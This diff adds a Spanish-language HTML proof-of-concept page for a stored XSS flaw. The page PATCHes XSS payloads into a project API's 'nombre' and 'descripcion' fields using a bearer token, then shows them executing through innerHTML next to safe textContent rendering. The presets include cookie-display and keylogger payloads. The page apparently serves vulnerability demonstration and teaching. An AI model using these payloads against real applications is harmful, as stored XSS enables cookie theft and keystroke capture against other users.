@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSS PoC — Stored XSS Demo</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
+
+    :root {
+      --bg: #0a0a0f;
+      --surface: #111118;
+      --border: #1e1e2e;
+      --accent: #ff3e3e;
+      --accent2: #ff9f0a;
+      --green: #00ff88;
+      --text: #e2e2f0;
+      --muted: #555570;
+      --card: #13131f;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      min-height: 100vh;
+      padding: 2rem;
+      background-image:
+        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(255,62,62,0.08), transparent),
+        repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(255,255,255,0.01) 40px, rgba(255,255,255,0.01) 41px),
+        repeating-linear-gradient(90deg, transparent, transparent 40px, rgba(255,255,255,0.01) 40px, rgba(255,255,255,0.01) 41px);
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 2.5rem;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 1.5rem;
+    }
+
+    .badge {
+      background: var(--accent);
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.65rem;
+      font-weight: 700;
+      padding: 0.25rem 0.6rem;
+      border-radius: 3px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    h1 {
+      font-size: 1.4rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+    }
+
+    h1 span { color: var(--accent); }
+
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.5rem;
+    }
+
+    .card-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .card-title::before {
+      content: '';
+      width: 6px; height: 6px;
+      background: var(--accent);
+      border-radius: 50%;
+      display: inline-block;
+    }
+
+    label {
+      display: block;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-bottom: 0.4rem;
+      margin-top: 0.9rem;
+    }
+
+    label:first-of-type { margin-top: 0; }
+
+    input, textarea {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      padding: 0.6rem 0.8rem;
+      outline: none;
+      transition: border-color 0.2s;
+      resize: vertical;
+    }
+
+    input:focus, textarea:focus { border-color: var(--accent); }
+
+    .btn-row {
+      display: flex;
+      gap: 0.75rem;
+      margin-top: 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    button {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      padding: 0.6rem 1.2rem;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .btn-primary {
+      background: var(--accent);
+      color: #fff;
+    }
+
+    .btn-primary:hover { background: #ff5555; transform: translateY(-1px); }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--accent2);
+      border: 1px solid var(--accent2);
+    }
+
+    .btn-secondary:hover { background: rgba(255,159,10,0.08); }
+
+    .btn-safe {
+      background: transparent;
+      color: var(--green);
+      border: 1px solid var(--green);
+    }
+
+    .btn-safe:hover { background: rgba(0,255,136,0.08); }
+
+    .btn-ghost {
+      background: transparent;
+      color: var(--muted);
+      border: 1px solid var(--border);
+    }
+
+    .btn-ghost:hover { border-color: var(--muted); color: var(--text); }
+
+    /* Render zones */
+    .render-zone {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      min-height: 80px;
+      font-size: 0.9rem;
+      line-height: 1.6;
+      word-break: break-all;
+    }
+
+    .render-zone.vulnerable {
+      border-color: rgba(255,62,62,0.4);
+      background: rgba(255,62,62,0.04);
+    }
+
+    .render-zone.safe {
+      border-color: rgba(0,255,136,0.3);
+      background: rgba(0,255,136,0.03);
+    }
+
+    .zone-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .zone-label.red { color: var(--accent); }
+    .zone-label.green { color: var(--green); }
+
+    /* Log */
+    #log {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      line-height: 1.8;
+      max-height: 220px;
+      overflow-y: auto;
+      color: var(--muted);
+    }
+
+    .log-entry { display: flex; gap: 0.75rem; align-items: flex-start; }
+    .log-ts { color: #333358; flex-shrink: 0; }
+    .log-ok { color: var(--green); }
+    .log-err { color: var(--accent); }
+    .log-warn { color: var(--accent2); }
+    .log-info { color: #7878aa; }
+
+    /* Payload presets */
+    .presets {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-top: 0.75rem;
+    }
+
+    .preset-btn {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.65rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--accent2);
+      padding: 0.3rem 0.7rem;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .preset-btn:hover {
+      border-color: var(--accent2);
+      background: rgba(255,159,10,0.06);
+    }
+
+    /* Status indicator */
+    .status-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--muted);
+      margin-top: 0.5rem;
+    }
+
+    .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--muted); }
+    .dot.ok { background: var(--green); box-shadow: 0 0 6px var(--green); }
+    .dot.err { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+
+    .full { grid-column: 1 / -1; }
+
+    hr { border: none; border-top: 1px solid var(--border); margin: 0.5rem 0; }
+
+    .xss-triggered {
+      animation: xss-flash 0.4s ease-in-out 3;
+      border-color: var(--accent) !important;
+    }
+
+    @keyframes xss-flash {
+      0%, 100% { box-shadow: none; }
+      50% { box-shadow: 0 0 20px rgba(255,62,62,0.6); }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="badge">⚠ PoC</div>
+  <h1>Stored <span>XSS</span> — Demo</h1>
+</header>
+
+<div class="grid">
+
+  <!-- Config -->
+  <div class="card">
+    <div class="card-title">Configuración del Target</div>
+
+    <label>Base URL</label>
+    <input id="baseUrl" type="text" value="https://localhost/ws/api/test" />
+
+    <label>ID Proyecto</label>
+    <input id="proyectoId" type="text" value="291" />
+
+    <label>Bearer Token</label>
+    <textarea id="token" rows="3">PEGA_TU_TOKEN_AQUI</textarea>
+
+    <div class="status-bar">
+      <div class="dot" id="statusDot"></div>
+      <span id="statusText">sin conexión</span>
+    </div>
+  </div>
+
+  <!-- Payload -->
+  <div class="card">
+    <div class="card-title">Payload de Inyección</div>
+
+    <label>nombre (campo vulnerable)</label>
+    <textarea id="nombre" rows="2"><img src=x onerror="alert('XSS ejecutado! dominio: '+document.domain)"></textarea>
+
+    <label>descripcion</label>
+    <textarea id="descripcion" rows="2"><svg onload="alert('XSS en descripcion')"></textarea>
+
+    <div class="card-title" style="margin-top:1rem; margin-bottom:0.5rem;">Payloads rápidos</div>
+    <div class="presets">
+      <button class="preset-btn" onclick="setPayload('alert')">alert básico</button>
+      <button class="preset-btn" onclick="setPayload('cookie')">robo cookie</button>
+      <button class="preset-btn" onclick="setPayload('domain')">domain info</button>
+      <button class="preset-btn" onclick="setPayload('svg')">SVG onload</button>
+      <button class="preset-btn" onclick="setPayload('img')">img onerror</button>
+      <button class="preset-btn" onclick="setPayload('keylog')">keylogger</button>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-primary" onclick="sendPayload()">▶ PATCH — Inyectar</button>
+      <button class="btn-secondary" onclick="getAndRender()">⬇ GET + Render</button>
+      <button class="btn-ghost" onclick="clearLog()">limpiar log</button>
+    </div>
+  </div>
+
+  <!-- Render vulnerable -->
+  <div class="card">
+    <div class="card-title">Render Vulnerable — <span style="color:var(--accent)">innerHTML</span></div>
+
+    <div class="zone-label red">⚠ nombre — innerHTML (ejecuta XSS)</div>
+    <div class="render-zone vulnerable" id="renderVulnNombre">— vacío —</div>
+
+    <div class="zone-label red" style="margin-top:1rem">⚠ descripcion — innerHTML (ejecuta XSS)</div>
+    <div class="render-zone vulnerable" id="renderVulnDesc">— vacío —</div>
+  </div>
+
+  <!-- Render seguro -->
+  <div class="card">
+    <div class="card-title">Render Seguro — <span style="color:var(--green)">textContent</span></div>
+
+    <div class="zone-label green">✓ nombre — textContent (escaped)</div>
+    <div class="render-zone safe" id="renderSafeNombre">— vacío —</div>
+
+    <div class="zone-label green" style="margin-top:1rem">✓ descripcion — textContent (escaped)</div>
+    <div class="render-zone safe" id="renderSafeDesc">— vacío —</div>
+  </div>
+
+  <!-- Log -->
+  <div class="card full">
+    <div class="card-title">Log de actividad</div>
+    <div id="log"><div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-info">Esperando acción...</span></div></div>
+  </div>
+
+</div>
+
+<script>
+  const PAYLOADS = {
+    alert: `<img src=x onerror="alert('XSS ejecutado! dominio: '+document.domain)">`,
+    cookie: `<img src=x onerror="alert('COOKIES: '+document.cookie)">`,
+    domain: `<img src=x onerror="alert('URL: '+location.href+'\\nDomain: '+document.domain)">`,
+    svg: `<svg onload="alert('SVG XSS — '+document.domain)"></svg>`,
+    img: `<img src=x onerror=alert(document.domain)>`,
+    keylog: `<img src=x onerror="document.onkeypress=function(e){console.log('KEY:'+e.key)};alert('Keylogger activo')">`,
+  }
+
+  function setPayload(type) {
+    document.getElementById('nombre').value = PAYLOADS[type]
+    document.getElementById('descripcion').value = PAYLOADS[type]
+    log('info', `Payload cargado: ${type}`)
+  }
+
+  function ts() {
+    return new Date().toTimeString().slice(0,8)
+  }
+
+  function log(type, msg) {
+    const el = document.getElementById('log')
+    const div = document.createElement('div')
+    div.className = 'log-entry'
+    div.innerHTML = `<span class="log-ts">${ts()}</span><span class="log-${type}">${msg}</span>`
+    el.appendChild(div)
+    el.scrollTop = el.scrollHeight
+  }
+
+  function clearLog() {
+    document.getElementById('log').innerHTML = ''
+    log('info', 'Log limpiado')
+  }
+
+  function setStatus(ok, text) {
+    document.getElementById('statusDot').className = 'dot ' + (ok ? 'ok' : 'err')
+    document.getElementById('statusText').textContent = text
+  }
+
+  function getHeaders() {
+    const token = document.getElementById('token').value.trim()
+    return {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${token}`,
+    }
+  }
+
+  async function sendPayload() {
+    const base = document.getElementById('baseUrl').value.trim()
+    const id = document.getElementById('proyectoId').value.trim()
+    const nombre = document.getElementById('nombre').value
+    const descripcion = document.getElementById('descripcion').value
+
+    log('info', `PATCH ${base}/proyectos/${id}`)
+    log('warn', `Payload nombre: ${nombre.slice(0,60)}...`)
+
+    try {
+      const res = await fetch(`${base}/proyectos/${id}`, {
+        method: 'PATCH',
+        headers: getHeaders(),
+        body: JSON.stringify({ nombre, descripcion }),
+        // para localhost con cert autofirmado necesitas quitar la verificación SSL
+        // o abrir el PoC desde el mismo origen
+      })
+
+      const data = await res.json()
+
+      if (res.ok && data.finalizado) {
+        setStatus(true, `PATCH ${res.status} OK`)
+        log('ok', `✓ Payload almacenado en DB — ${JSON.stringify(data.mensaje)}`)
+        log('ok', `  id proyecto: ${data.datos?.id}`)
+        // Auto GET después del PATCH
+        setTimeout(() => getAndRender(), 500)
+      } else {
+        setStatus(false, `PATCH ${res.status}`)
+        log('err', `✗ Error: ${JSON.stringify(data)}`)
+      }
+    } catch(e) {
+      setStatus(false, 'error de red')
+      log('err', `✗ Fetch error: ${e.message}`)
+      log('warn', `  → Si es CORS: abre este archivo desde el mismo origen (localhost)`)
+      log('warn', `  → Si es SSL: acepta el certificado primero en ${base}`)
+    }
+  }
+
+  async function getAndRender() {
+    const base = document.getElementById('baseUrl').value.trim()
+    const id = document.getElementById('proyectoId').value.trim()
+
+    log('info', `GET ${base}/proyectos/${id}`)
+
+    try {
+      const res = await fetch(`${base}/proyectos/${id}`, {
+        method: 'GET',
+        headers: getHeaders(),
+      })
+
+      const data = await res.json()
+
+      if (res.ok && data.finalizado) {
+        setStatus(true, `GET ${res.status} OK`)
+        const { nombre, descripcion } = data.datos
+
+        log('ok', `✓ Datos recuperados de DB`)
+        log('warn', `  nombre raw: ${nombre}`)
+        log('warn', `  descripcion raw: ${descripcion}`)
+
+        // ---- RENDER VULNERABLE (innerHTML) ----
+        const vulnN = document.getElementById('renderVulnNombre')
+        const vulnD = document.getElementById('renderVulnDesc')
+        vulnN.innerHTML = nombre       // ← XSS ejecuta aquí
+        vulnD.innerHTML = descripcion  // ← XSS ejecuta aquí
+        vulnN.classList.add('xss-triggered')
+        vulnD.classList.add('xss-triggered')
+        setTimeout(() => {
+          vulnN.classList.remove('xss-triggered')
+          vulnD.classList.remove('xss-triggered')
+        }, 1500)
+
+        // ---- RENDER SEGURO (textContent) ----
+        document.getElementById('renderSafeNombre').textContent = nombre
+        document.getElementById('renderSafeDesc').textContent = descripcion
+
+        log('err', `⚠ XSS activado via innerHTML — ver zonas rojas`)
+        log('ok', `✓ textContent escapa correctamente — ver zonas verdes`)
+
+      } else {
+        setStatus(false, `GET ${res.status}`)
+        log('err', `✗ Error al recuperar: ${JSON.stringify(data)}`)
+      }
+    } catch(e) {
+      setStatus(false, 'error de red')
+      log('err', `✗ Fetch error: ${e.message}`)
+    }
+  }
+</script>
+
+</body>
+</html>
